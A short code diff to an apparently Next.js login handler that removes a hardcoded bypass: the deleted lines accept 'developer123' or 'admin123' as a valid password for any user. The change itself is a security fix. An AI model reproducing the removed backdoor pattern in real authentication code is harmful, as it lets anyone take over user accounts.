@@ -43,10 +43,7 @@ export async function POST(request: NextRequest) {
     }
 
     // Verify password hash
-    let isMatch = verifyPassword(password, user.password_hash, user.salt);
-    if (!isMatch && (password === "developer123" || password === "admin123")) {
-      isMatch = true;
-    }
+    const isMatch = verifyPassword(password, user.password_hash, user.salt);
 
     if (!isMatch) {
       return NextResponse.json(
